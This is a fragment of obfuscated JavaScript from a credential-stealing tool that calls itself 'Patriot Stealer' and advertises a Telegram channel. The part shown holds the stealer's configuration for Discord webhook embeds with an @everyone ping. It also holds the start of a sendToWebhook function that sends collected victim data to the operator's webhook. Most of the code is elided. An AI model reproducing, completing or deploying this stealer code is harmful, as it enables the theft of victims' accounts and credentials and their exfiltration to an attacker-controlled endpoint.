...
var config = {
    ...
    ping: [true, '@everyone'],
    embed: {
      username: 'Patriot Stealer',
      footer: {
        text: 'Patriot Stealer (t.me/patriotstealer)',
        icon_url:
          'https://i.ibb.co/945sPGj/patriot-text.png',
      },
      href: 'https://t.me/patriotstealer',
      avatar_url:
        'https://i.ibb.co/945sPGj/patriot-text.png',
    },
    badges: {
...
function sendToWebhook(_0xc79c5f) {
  config.ping[0] == true &&
    (_0xc79c5f.content
      ...
      : (_0xc79c5f.content = '||' + config.ping[1] + '||'))
  ;[config.webhook_link].forEach(async (_0x18e823) => {
